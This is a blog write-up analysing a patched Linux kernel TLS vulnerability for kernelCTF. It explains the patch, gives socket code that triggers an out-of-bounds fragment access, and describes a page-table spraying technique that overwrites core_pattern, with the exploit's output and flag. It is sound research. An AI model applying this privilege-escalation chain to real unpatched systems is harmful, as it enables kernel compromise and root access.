---
layout: post
title:  "Analyze Linux Kernel 1-day 0aeb54ac"
categories: Linux
---

One day, @farazsth98 asked me if I had analyzed the latest 1-day kernelCTF slot. I hadn’t analyzed it yet, but I thought it was a good time to do something interesting — especially since preparing a talk is exhausting 😭.

The vulnerability occurred in the TLS subsystem, and its [commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0aeb54ac4cd5cf8f60131b4d9ec0b6dc9c27b20d) revealed many details about the triggering scenario.

This post is just a quick note about my reproduction, so it helps if you already have some background knowledge of TLS before reading.

Some of my previous posts might also be useful:

- [Linux Kernel TLS Part 1]({% post_url 2025-01-20-linux-kernel-tls-part-1 %})
- [Linux Kernel TLS Part 2]({% post_url 2025-01-21-linux-kernel-tls-part-2 %})
- [Analysis of CVE-2025-37756, an UAF Vulnerability in Linux KTLS]({% post_url 2025-09-03-analysis-of-CVE-2025-37756-an-uaf-vulnerability-in-linux-ktls %})

## 1. Patch Analysis

### 1.1. Key Problem

The patch updates several files, but the core issue lies in `tls_rx_msg_size()`.

``` diff
@@ -2474,8 +2474,7 @@ int tls_rx_msg_size(struct tls_strparser *strp, struct sk_buff *skb)
     return data_len + TLS_HEADER_SIZE;
 
 read_failure:
-    tls_err_abort(strp->sk, ret);
-
+    tls_strp_abort_strp(strp, ret);
     return ret;
```

The `tls_rx_msg_size()` function is used to calculate the total TLS record size from the header [1]. Before the patch, if the size was too small [2] or too large [3], `tls_err_abort()` was called to set the socket error state [4].

``` c
int tls_rx_msg_size(struct tls_strparser *strp, struct sk_buff *skb)
{
    // [...]
    data_len = ((header[4] & 0xFF) | (header[3] << 8)); // [1]

    if (data_len > TLS_MAX_PAYLOAD_SIZE /* 0x4000 */ + cipher_overhead + // [2]
        prot->tail_size) {
        ret = -EMSGSIZE;
        goto read_failure;
    }
    
    // [...]
    if (data_len < cipher_overhead) { // [3]
        ret = -EBADMSG;
        goto read_failure;
    }

    // [...]
read_failure:
    tls_err_abort(strp->sk, ret);

    return ret;
}

noinline void tls_err_abort(struct sock *sk, int err)
{
    // [...]
    WRITE_ONCE(sk->sk_err, -err); // [4]
    // [...]
    sk_error_report(sk);
}
```

After the patch, the call to `tls_err_abort()` is replaced with `tls_strp_abort_strp()`.

Unlike `tls_err_abort()`, `tls_strp_abort_strp()` not only sets the socket error state, but also **stops the TLS stream parser** [5].

``` c
static void tls_strp_abort_strp(struct tls_strparser *strp, int err)
{
    if (strp->stopped)
        return;

    strp->stopped = 1; // [5]
    // [...]
    WRITE_ONCE(strp->sk->sk_err, -err);
    // [...]
    sk_error_report(strp->sk);
}
```

If the `stopped` flag is set [6], the TLS packet receive callback `tls_strp_read_sock()` will no longer be invoked [7], effectively preventing the TLS parser from processing further packets.

``` c
void tls_strp_check_rcv(struct tls_strparser *strp)
{
    if (unlikely(strp->stopped) /* [6] */ || strp->msg_ready)
        return;

    if (tls_strp_read_sock(strp) == -ENOMEM) // [7]
        queue_work(tls_strp_wq, &strp->work);
}
```

The only affected path is `tls_strp_copyin_frag()`. Since its call to `tls_rx_msg_size()` would previously return an error **without setting the `stopped` flag**, the function could be triggered repeatedly, leading to unintended side effects.

``` c
static int tls_strp_copyin_frag(struct tls_strparser *strp, struct sk_buff *skb,
                struct sk_buff *in_skb, unsigned int offset,
                size_t in_len)
{
    // [...]
    if (!strp->stm.full_len) {
        // [...]
        sz = tls_rx_msg_size(strp, skb);
        if (sz < 0)
            return sz;
    }
    // [...]
}
```

### 1.2. Exploit Path

The patch for socket fragment handling in `tls_strp_copyin_frag()` prevents the exploitation path.

Previously, developers assumed that `skb->len` was bounded by the maximum value `TLS_MAX_PAYLOAD_SIZE`, and therefore **did not further validate the calculated fragment index**.

However, because `tls_strp_copyin_frag()` could be invoked multiple times, `skb->len` may grow excessively. As a result, the fragment index could **become larger than the total fragment count**, leading to out-of-bounds memory access or the use of uninitialized memory.

``` diff
@@ -211,11 +211,17 @@ static int tls_strp_copyin_frag(struct tls_strparser *strp, struct sk_buff *skb,
                 struct sk_buff *in_skb, unsigned int offset,
                 size_t in_len)
 {
+    unsigned int nfrag = skb->len / PAGE_SIZE;
     size_t len, chunk;
     skb_frag_t *frag;
     int sz;
 
-    frag = &skb_shinfo(skb)->frags[skb->len / PAGE_SIZE];
+    if (unlikely(nfrag >= skb_shinfo(skb)->nr_frags)) {
+        DEBUG_NET_WARN_ON_ONCE(1);
+        return -EMSGSIZE;
+    }
+
+    frag = &skb_shinfo(skb)->frags[nfrag];
```

This patch introduces stricter validation of the packet length to ensure safer fragment handling.


## 2. Trigger the Vulnerability

Two conditions must be satisfied to trigger the vulnerability:
1. TLS stream copy mode (`strp->copy_mode`) is enabled.
2. The packet length `skb->len` is sufficiently small.

### 2.1. Enabling Stream Copy Mode

When the **receive buffer becomes insufficient** [1], the TLS parser enables copy mode [2] and uses `tls_strp_read_copyin()` to process subsequent packets [3, 4].

``` c
static int tls_strp_read_copy(struct tls_strparser *strp, bool qshort)
{
    if (likely(qshort /* true */ && !tcp_epollin_ready(strp->sk, INT_MAX)))
        return 0;

    // [...]
    strp->copy_mode = 1; // [2]
    
    // [...]
    tls_strp_read_copyin(strp); // [3]
}

static inline bool tcp_epollin_ready(const struct sock *sk, int target /* INT_MAX */)
{
    const struct tcp_sock *tp = tcp_sk(sk);
    int avail = READ_ONCE(tp->rcv_nxt) - READ_ONCE(tp->copied_seq);

    if (avail <= 0)
        return false;

    return (avail >= target) || tcp_rmem_pressure(sk) /* [1] */ ||
           (tcp_receive_window(tp) <= inet_csk(sk)->icsk_ack.rcv_mss);
}

static int tls_strp_read_sock(struct tls_strparser *strp)
{
    // [...]
    if (unlikely(strp->copy_mode))
        return tls_strp_read_copyin(strp); // [4]
    // [...]
}
```

### 2.2. Small Packet Size

The value of `strp->stm.full_len` depends on the return value of `tls_rx_msg_size()` [1].

``` c
static int tls_strp_read_sock(struct tls_strparser *strp)
{
    // [...]
    if (!strp->stm.full_len) {
        sz = tls_rx_msg_size(strp, strp->anchor);
        if (sz < 0) {
            tls_strp_abort_strp(strp, sz);
            return sz;
        }

        strp->stm.full_len = sz; // [1]
        // [...]
    }
    // [...]
}
```

The function `tls_rx_msg_size()` returns 0 as the packet size only when the packet is **still too small to be parsed** [2].

``` c
int tls_rx_msg_size(struct tls_strparser *strp, struct sk_buff *skb)
{
    struct tls_context *tls_ctx = tls_get_ctx(strp->sk);
    struct tls_prot_info *prot = &tls_ctx->prot_info;
    char header[TLS_HEADER_SIZE + TLS_MAX_IV_SIZE];
    size_t cipher_overhead;
    size_t data_len = 0;
    int ret;

    // [...]
    if (strp->stm.offset + prot->prepend_size /* 13 */ > skb->len) // [2]
        return 0;
    // [...]
}
```

However, these two conditions **appear to conflict** 🤯: if the packet size is too small, the receive buffer will remain empty, and copy mode will not be enabled.

## 2.3. OOB Packet

**Out-of-band (OOB)**, also known as **Urgent**, is a packet type used to notify the receiver of an emergency condition. This type of packet contains only a single byte of data and has higher priority than a normal packet.

`tcp_rcv_established()` calls `tcp_urg()` to handle urgent packets before calling `tcp_data_queue()` to process regular data.

``` c
void tcp_rcv_established(struct sock *sk, struct sk_buff *skb)
{
    // [...]
    tcp_urg(sk, skb, th);
    
    // [...]
    tcp_data_queue(sk, skb);
    
    // [...]
}
```

`tcp_urg()` first checks whether the packet is an urgent packet by calling `tcp_check_urg()`. If it is, the urgent packet sequence `tp->urg_seq` is updated [1], and `tls_strp_read_sock()` is invoked internally [2].

``` c
static void tcp_urg(struct sock *sk, struct sk_buff *skb, const struct tcphdr *th)
{
    struct tcp_sock *tp = tcp_sk(sk);

    if (unlikely(th->urg))
        tcp_check_urg(sk, th);
    
    // [...]
    if (unlikely(tp->urg_data == TCP_URG_NOTYET)) {
        if (ptr < skb->len) {
            // [...]
            skb_copy_bits(skb, ptr, &tmp, 1);
            WRITE_ONCE(tp->urg_data, TCP_URG_VALID | tmp);
            sk->sk_data_ready(sk); // [2]
            // [...]
        }
    }
}

static void tcp_check_urg(struct sock *sk, const struct tcphdr *th)
{
    u32 ptr = ntohs(th->urg_ptr);

    // [...]
    ptr += ntohl(th->seq);

    /* Ignore urgent data that we've already seen and read. */
    if (after(tp->copied_seq, ptr))
        return;
    if (before(ptr, tp->rcv_nxt))
        return;
    
    // Allow newer urgent
    if (tp->urg_data && !after(ptr, tp->urg_seq))
        return;
    
    // [...]
    WRITE_ONCE(tp->urg_data, TCP_URG_NOTYET);
    WRITE_ONCE(tp->urg_seq, ptr); // [1]
}
```

`tls_strp_read_sock()` calls `tcp_inq()` to obtain the **current TCP in-queue size** [2], i.e., how much data can be retrieved. This value depends on whether there is urgent data.

Each time a new urgent packet arrives, `tp->urg_seq` is set to `tp->rcv_nxt`, so all `tcp_inq()` calls from `tcp_urg()` fall into the second branch [3], returning the remaining data count.

``` c
static int tls_strp_read_sock(struct tls_strparser *strp)
{
    int sz, inq;

    inq = tcp_inq(strp->sk); // [2]
    if (inq < 1)
        return 0;

    // [...]
}

static inline int tcp_inq(struct sock *sk)
{
    struct tcp_sock *tp = tcp_sk(sk);
    int answ;

    // [...]
    else if (sock_flag(sk, SOCK_URGINLINE) ||
           !tp->urg_data ||
           before(tp->urg_seq, tp->copied_seq) ||
           !before(tp->urg_seq, tp->rcv_nxt)) {

        answ = tp->rcv_nxt - tp->copied_seq; // [3]
        // [...]
    } else {
        answ = tp->urg_seq - tp->copied_seq; // [5]
    }

    return answ;
}
```

After that, `tcp_data_queue()` is called, and then `tls_strp_read_sock()` is invoked again [4].

This time, since the one-byte urgent data has already been processed and `tp->rcv_nxt` has been updated, `tcp_inq()` takes the last branch [5], returning the size of the remaining urgent data in the queue.

``` c
static void tcp_data_queue(struct sock *sk, struct sk_buff *skb)
{
    // [...]
    if (TCP_SKB_CB(skb)->seq == tp->rcv_nxt) {
        // [...]
        eaten = tcp_queue_rcv(sk, skb, &fragstolen);
        
        // [...]
        if (!sock_flag(sk, SOCK_DEAD))
            tcp_data_ready(sk); // [4]
        return;
    }
}
```

The function `tcp_queue_rcv()` not only processes packet data but also attempts to coalesce the data size [6].

This means if the previous `skb` has enough buffer space, the **new skb will be merged into it**.

``` c
static int __must_check tcp_queue_rcv(struct sock *sk, struct sk_buff *skb,
                      bool *fragstolen)
{
    int eaten;
    struct sk_buff *tail = skb_peek_tail(&sk->sk_receive_queue);

    eaten = (tail &&
         tcp_try_coalesce(sk, tail, // [6]
                  skb, fragstolen)) ? 1 : 0;
    tcp_rcv_nxt_update(tcp_sk(sk), TCP_SKB_CB(skb)->end_seq);
    if (!eaten) {
        tcp_add_receive_queue(sk, skb);
        skb_set_owner_r(skb, sk);
    }
    return eaten;
}
```

A flow diagram makes the sequence update clearer.

<img src="/assets/image-20251003135826244.png" alt="image-20251003135826244" style="display: block; margin-left: auto; margin-right: auto; zoom:50%;" />

## 2.4. Combine All Together

After establishing the connection, we set the receive buffer of the server-side socket to the minimum size.

``` c
int rcvbuf_size = 0x0;
setsockopt(accept_fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf_size, sizeof(rcvbuf_size));
```

On the client side, we send the following packets:

``` c
send(client_fd, data, 1, 0);       // copied_seq=0, urg_seq=0, rcv_nxt=1
send(client_fd, data, 1, MSG_OOB); // copied_seq=0, urg_seq=1, rcv_nxt=2
send(client_fd, data, 0x2000, 0);  // copied_seq=0, urg_seq=1, rcv_nxt=0x2002
```

When the last packet is sent, `tcp_inq()` returns 1 [1] (`urg_seq` - `copied_seq`), and `tls_strp_load_anchor_with_queue()` sets the anchor’s `skb->len` to `inq`. Since `skb->len` is smaller than the prepend size, `tls_rx_msg_size()` [3] returns zero, and `tls_strp_read_copy()` is then called [4].

``` c
static int tls_strp_read_sock(struct tls_strparser *strp)
{
    int sz, inq;

    inq = tcp_inq(strp->sk); // [1]
    if (inq < 1)
        return 0;

    tls_strp_load_anchor_with_queue(strp, inq); // [2]
    
    // [...]
    if (!strp->stm.full_len) {
        sz = tls_rx_msg_size(strp, strp->anchor); // [3]
        // [...]

        strp->stm.full_len = sz;

        if (!strp->stm.full_len || inq < strp->stm.full_len)
            return tls_strp_read_copy(strp, true); // [4]
    }
}
```

Because we send a packet larger than the receive buffer, `tcp_epollin_ready()` returns true [5], and **copy mode is enabled** [6].

Afterwards, `tls_strp_read_copyin()` is used to receive the data.

``` c
static int tls_strp_read_copy(struct tls_strparser *strp, bool qshort)
{
    if (likely(qshort && !tcp_epollin_ready(strp->sk, INT_MAX))) // [5]
        return 0;

    strp->copy_mode = 1; // [6]
    // [...]
    tls_strp_read_copyin(strp);
    return 0;
}
```

Internally, the TCP receive queue is iterated, and each retrieved packet along with its size is passed to `tls_strp_copyin_frag()` as the `in_skb` and `in_len` parameters.

In this function, the `in_skb` packet data is copied into the corresponding fragment (`->frags[]`) of the anchor packet. Since fragments store packet data in page units, `tls_strp_copyin_frag()` first calculates the fragment index **using `skb->len / PAGE_SIZE`** [7].

If the record size (`strp->stm.full_len`) is still not determined [8], the packet is reparsed. The data is first copied into the buffer [9], `skb->len` is updated, and then the record header is parsed [10].

``` c
static int tls_strp_copyin_frag(struct tls_strparser *strp, struct sk_buff *skb,
                struct sk_buff *in_skb, unsigned int offset,
                size_t in_len)
{
    // [...]
    frag = &skb_shinfo(skb)->frags[skb->len / PAGE_SIZE]; // [7]
    
    // [...]
    if (!strp->stm.full_len) { // [8]
        chunk = min_t(size_t, len, PAGE_SIZE - skb_frag_size(frag));
        WARN_ON_ONCE(skb_copy_bits(in_skb, offset, skb_frag_address(frag) + skb_frag_size(frag), chunk)); // [9] 

        skb->len += chunk;
        skb->data_len += chunk;
        skb_frag_size_add(frag, chunk);

        sz = tls_rx_msg_size(strp, skb); // [10]
        if (sz < 0)
            return sz;
        // [..]
    }
    // [..]
}
```

However, due to this vulnerability, **a malformed header may cause the packet not to be consumed (eaten)**. As a result, `skb->len` continues to grow, leading to an **out-of-bounds index** when accessing `frags[]`.

## 2.5. Access Uninitialized Fragment

After copy mode is enabled, we restore the receive buffer size of the accepted socket on the server side:

``` c
int rcvbuf_size = 0x20000;
setsockopt(accept_fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf_size, sizeof(rcvbuf_size));
```

On the client side, the first call to `__tcp_read_sock()` consumes the urgent packet and updates `copied_seq` to match `urg_seq`. This causes `tcp_inq()` to return zero, preventing further progress.

To bypass this, we first **send a `MSG_OOB` packet to update `urg_seq`**:

``` c
send(client_fd, ptr, 1, MSG_OOB);
```

Afterwards, we can **trigger `tls_strp_copyin_frag()` by sending additional packets**. Each packet increases `skb->len` by `0x1000`.

According to `tls_strp_read_copy()`, five pages [1] are allocated and populated into the fragment array of the anchor `skb` [2]:

``` c
static int tls_strp_read_copy(struct tls_strparser *strp, bool qshort)
{
    // [...]
    need_spc = strp->stm.full_len ?: TLS_MAX_PAYLOAD_SIZE /* 0x4000 */ + PAGE_SIZE /* 0x1000 */; // [1]
    
    // [...]
    for (len = need_spc; len > 0; len -= PAGE_SIZE) {
        page = alloc_page(strp->sk->sk_allocation);
        // [...]
        skb_fill_page_desc(strp->anchor, shinfo->nr_frags++, // [2]
                   page, 0, 0);
    }
}
```

So, after sending four packets (excluding the initial OOB), `skb->len` becomes 4 x `0x1000` = `0x4000`. The initial OOB also increases `skb->len` by `0x1000`, so **the total is `0x5000`**. At this point `skb->len / PAGE_SIZE == 5`, which exceeds the initialized fragment array and causes an out-of-bounds access. The out-of-bounds access in `frags[]` will be triggered when **the fifth packet** is sent.

``` c
for (int i = 0; i < 4; i++) {
    send(client_fd, ptr, 1, 0);
}
send(client_fd, ptr, 1, 0);
```

## 3. Exploit

### 3.1. Spraying TCP Socket

The anchor packet is allocated in `tls_strp_init()`:

``` c
int tls_strp_init(struct tls_strparser *strp, struct sock *sk)
{
    // [...]
    strp->sk = sk;
    strp->anchor = alloc_skb(0, GFP_KERNEL);
    // [...]
}
```

Internally, `alloc_skb()` calls `kmalloc_reserve()` to allocate the data buffer. In this case, the buffer is allocated from `skb_small_head_cache` [1].

``` c
static inline struct sk_buff *alloc_skb(unsigned int size,
                    gfp_t priority)
{
    return __alloc_skb(size, priority, 0, NUMA_NO_NODE); // <--------------------
}

struct sk_buff *__alloc_skb(unsigned int size, gfp_t gfp_mask,
                int flags, int node)
{
    // [...]
    skb = kmem_cache_alloc_node(cache, gfp_mask & ~GFP_DMA, node);
    // [...]
    data = kmalloc_reserve(&size, gfp_mask, node, &pfmemalloc); // <--------------------
    // [...]
    __build_skb_around(skb, data, size);
}

static void *kmalloc_reserve(unsigned int *size, gfp_t flags, int node,
                 bool *pfmemalloc)
{
    obj_size = SKB_HEAD_ALIGN(*size);

    if (obj_size <= SKB_SMALL_HEAD_CACHE_SIZE && !(flags & KMALLOC_NOT_NORMAL_BITS)) {
        obj = kmem_cache_alloc_node(net_hotdata.skb_small_head_cache, flags | __GFP_NOMEMALLOC | __GFP_NOWARN, node); // [1]
        *size = SKB_SMALL_HEAD_CACHE_SIZE;
        // [...]
        goto out;
    }

    obj_size = kmalloc_size_roundup(obj_size);
    // [...]
}
```

After the data buffer is allocated, `__finalize_skb_around()` is called internally by `__build_skb_around()` to initialize it. Fortunately, **the `frags[]` array remains uninitialized**, which allows us to populate it by spraying.

``` c
// called by __build_skb_around()
static inline void __finalize_skb_around(struct sk_buff *skb, void *data,
                     unsigned int size)
{
    // [...]
    skb->head = data;
    skb->data = data;
    // [...]
    shinfo = skb_shinfo(skb);
    // [...]
    memset(shinfo, 0, offsetof(struct skb_shared_info, dataref));
    // [...]
}
```

Therefore, we need to find a function call to `alloc_skb()` that **allocates the data buffer from `skb_small_head_cache`** and **allows us to populate the fragment array**.

At first, I tried spraying with TCP Unix sockets, but their data buffers are allocated from `kmalloc-512-cg`.

Next, I tried **normal TCP sockets**, and luckily, their buffers are allocated from `skb_small_head_cache` [2]. Perfect!

Additionally, if the packet data is passed through **the `SYS_splice` system call**, the message flag `MSG_SPLICE_PAGES` will be set [3], and the pages will be placed into the fragment array [4].

``` c
int tcp_sendmsg_locked(struct sock *sk, struct msghdr *msg, size_t size)
{
    // [...]
    else if (unlikely(msg->msg_flags & MSG_SPLICE_PAGES) && size) {
        if (sk->sk_route_caps & NETIF_F_SG)
            zc = MSG_SPLICE_PAGES; // [3]
    }
    // [...]

    while (msg_data_left(msg)) {
        skb = tcp_stream_alloc_skb(sk, sk->sk_allocation, first_skb); // [2]

        // [...]
        else if (zc == MSG_SPLICE_PAGES) {
            // [...]
            err = skb_splice_from_iter(skb, &msg->msg_iter, copy); // [4]
            // [...]
            copy = err;

            if (!(flags & MSG_NO_SHARED_FRAGS))
                skb_shinfo(skb)->flags |= SKBFL_SHARED_FRAG;

            // [...]
        }
    }
}
```

The call flow from splice to `tcp_sendmsg_locked()` is as follows:

```
__do_splice()
=> do_splice()
 => out->f_op->splice_write()
  => splice_to_socket()
   => sock_sendmsg()
    => __sock_sendmsg()
     => inet_sendmsg()
      => tcp_sendmsg()
       => tcp_sendmsg_locked()
```

Thus, we can **spray a large number of TCP sockets** and **splice six pages into each fragment array**. After that, freeing all of them will eventually cause one to be reclaimed by `strp->anchor`.

### 3.2. Spraying Pagetable

After the pages are released, we reclaim them by **spraying the page table**. When an out-of-bounds access is triggered in `tls_strp_copyin_frag()` [1], packet data is copied into the fragment and the copied content is under our control. This lets us **overwrite a PTE**.

``` c
static int tls_strp_copyin_frag(struct tls_strparser *strp, struct sk_buff *skb,
                struct sk_buff *in_skb, unsigned int offset,
                size_t in_len)
{
    // [...]
    frag = &skb_shinfo(skb)->frags[skb->len / PAGE_SIZE];
    
    // [...]
    if (!strp->stm.full_len) {
        chunk = min_t(size_t, len, PAGE_SIZE - skb_frag_size(frag));
        WARN_ON_ONCE(skb_copy_bits(in_skb, offset, skb_frag_address(frag) + skb_frag_size(frag), chunk)); // [1]
    }

    // [...]
}
```

Concretely, we add a new PTE pointing to `core_pattern[]` and overwrite it. Triggering a segmentation fault then causes the kernel to use the overwritten `core_pattern[]`, allowing us to retrieve the flag.

The exploit for lts-6.12.46 is [here](/assets/kernelCTF-1day-0aeb54ac.c). It works in the remote environment as well.

```
user@lts-6:/tmp$ ./test
./test
[+] initialize
[+] spraying pagetable
[+] count: 0 (for populate pagetable)
[+] craft PTEs
[+] /proc/sys/kernel/core_pattern: |/proc/%P/fd/666 %P

[   19.574504] test[205]: segfault at 0 ip 0000000000402a19 sp 00007fff67f2a5d0 error 6 in test[2a19,401000+96000] likely on CPU 0 (core 0, socket 0)
[   19.578581] Code: 48 89 ce 89 c7 e8 77 35 02 00 48 8d 45 c0 48 89 c6 48 8d 05 51 4d 09 00 48 89 c7 b8 00 00 00 00 e8 5c 3f 00 00 b8 00 00 00 00 <41
kernelCTF{v1:lts-6.12.46:1759486024:a15c6a431f0965768f9100391e6ebb695924f1f7}
[   19.603944] sysrq: Power Off
[   19.605689] ACPI: PM: Preparing to enter system sleep state S5
[   19.607641] kvm: exiting hardware virtualization
[   19.609214] reboot: Power down
```